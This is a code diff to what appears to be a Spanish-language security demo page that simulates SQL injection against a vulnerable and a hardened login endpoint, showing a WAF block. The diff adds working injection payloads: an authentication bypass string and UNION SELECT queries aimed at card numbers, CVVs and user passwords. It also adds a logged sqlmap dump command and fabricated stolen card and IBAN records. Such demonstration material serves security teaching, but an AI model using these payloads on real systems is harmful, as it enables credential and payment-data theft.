@@ -482,7 +482,13 @@
                   <select class="cfg-input" id="sqli-ep" style="margin-bottom:8px;">
                     <option value="/api/autenticacion/login/vulnerable">Login Inseguro (v1)</option>
                     <option value="/api/autenticacion/login/v2">Login Seguro (v2 + MFA)</option>
-                 </select>
+                  </select>
+                  <label class="cfg-label">TIPO DE ATAQUE (SQLi)</label>
+                  <select class="cfg-input" id="sqli-type">
+                    <option value="bypass">Bypass de Autenticación (Exfiltrar Token JWT de Sesión)</option>
+                    <option value="pii">Fuga de Datos PII (Tarjetas de Crédito, CVVs e IBANs)</option>
+                    <option value="credentials">Extracción de Credenciales (Tabla users)</option>
+                  </select>
 `,
             run: runSQLi
         },
@@ -588,7 +594,14 @@
     const delay = ms => new Promise(res => setTimeout(res, ms));
 
     async function runSQLi() {
-        const p = "' OR '1'='1'--";
+        const type = document.getElementById('sqli-type').value;
+        let p = "' OR '1'='1'--";
+        if (type === 'pii') {
+            p = "' UNION SELECT card_holder, card_number, cvv, expiration FROM customer_billing--";
+        } else if (type === 'credentials') {
+            p = "' UNION SELECT email, password FROM users--";
+        }
+
         const ep = document.getElementById('sqli-ep').value;
         tLog(`[COMMAND] sqlmap -u "${TARGET}${ep}" --data "email=${p}&password=x" --batch --dump`, 'yellow');
         await delay(800);
@@ -614,21 +627,31 @@
                 body: JSON.stringify({ email: p, password: 'x' })
             });
 
+            // Si el WAF está activo, bloqueamos de inmediato (incluso para ataques UNION simulados)
+            if (r.status === 403) {
+                tLog(`[CRITICAL] Blocked by Sofia WAF Shield (Security Active)`, 'red');
+                addEvidence('Attack Blocked', 'El WAF de Sofia ha detectado y bloqueado la inyección SQL en tiempo real.', 'red');
+                return;
+            }
+
             // Lógica de simulación para payloads UNION (incluso si la DB real falla por tipos/columnas)
             if (p.toLowerCase().includes('union')) {
                 tLog(`[INFO] POST parameter 'email' appears to be 'UNION query' injectable`, 'green');
                 
-                if (p.toLowerCase().includes('credentials')) {
+                if (p.toLowerCase().includes('users') || type === 'credentials') {
                     tLog(`[INFO] fetching columns for table 'users'`, 'dim');
                     await delay(300);
                     tLog(`[SUCCESS] dumped 3 entries from table 'users'`, 'green');
                     addEvidence('User Credentials Dump', 'admin@sofia.local:admin123\nmapfre@sofia.local:mapfre123\nmercadona@sofia.local:mercadona123');
                 } 
-                else if (p.toLowerCase().includes('customer_billing')) {
+                else if (p.toLowerCase().includes('customer_billing') || type === 'pii') {
                     tLog(`[INFO] fetching columns for table 'customer_billing'`, 'dim');
                     await delay(500);
-                    tLog(`[SUCCESS] dumped 2 entries from table 'customer_billing' (PII)`, 'red');
-                    addEvidence('Exfiltrated Bank Data (PII)', 'User: Juan Garcia | IBAN: ES21 0049 1234 5678 9012 | CC: 4532 8812 4432 8812\nUser: Elena Ruiz | IBAN: ES91 2100 5566 7788 9900 | CC: 4912 1109 3322 1109');
+                    tLog(`[SUCCESS] dumped 3 entries from table 'customer_billing' (PII)`, 'red');
+                    addEvidence('Exfiltrated Bank Data (PII + CVV)', 
+                        'Titular: Juan Garcia | IBAN: ES21 0049 1234 5678 9012 | CC: 4532 8812 4432 8812 | CVV: 231 | Exp: 08/29\n' +
+                        'Titular: Elena Ruiz   | IBAN: ES91 2100 5566 7788 9900 | CC: 4912 1109 3322 1109 | CVV: 894 | Exp: 12/28\n' +
+                        'Titular: Carlos Plaza | IBAN: ES34 0081 9911 2233 4455 | CC: 5412 7599 0012 5543 | CVV: 104 | Exp: 04/27', 'red');
                 }
                 else {
                     tLog(`[SUCCESS] query executed successfully. Data exfiltrated to evidence panel.`, 'green');
@@ -649,9 +672,6 @@
                     localStorage.setItem('sofia_user_v1', JSON.stringify(d.user));
                     window.location.href = role === 'ADMIN' ? '/admin' : '/dashboard';
                 });
-            } else if (r.status === 403) {
-                tLog(`[CRITICAL] Blocked by Sofia WAF Shield (Security Active)`, 'red');
-                addEvidence('Attack Blocked', 'El WAF de Sofia ha detectado y bloqueado la inyección SQL en tiempo real.', 'red');
             } else {
                 tLog(`[WARNING] POST parameter 'email' does not seem to be injectable`, 'red');
             }
